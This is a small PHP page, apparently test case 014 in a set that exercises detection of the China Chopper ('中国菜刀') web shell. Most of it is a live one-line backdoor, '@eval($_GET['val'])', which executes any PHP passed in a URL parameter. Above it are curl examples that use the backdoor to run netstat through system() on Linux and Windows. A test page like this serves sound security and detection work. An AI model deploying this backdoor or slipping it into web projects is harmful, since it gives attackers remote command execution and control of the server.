<html>
<head>	
	<meta charset="UTF-8"/>
	<title>014 - 中国菜刀</title>
</head>
<body>
	<h1>014 - 中国菜刀 - eval 方式</h1>

<p>不正常调用: </p>
<pre>curl '<?php echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?val=system("netstat+-anp");'?>'</pre>
<br>
<p>windows 不正常调用: </p>
<pre>curl '<?php echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?val=system("netstat+-ano");'?>'</pre>

<br>
<p>目录内容</p>
<?php

	if (isset($_GET['val'])) 
	{
		@eval($_GET['val']);
	}
    
?>
</body>
</html>
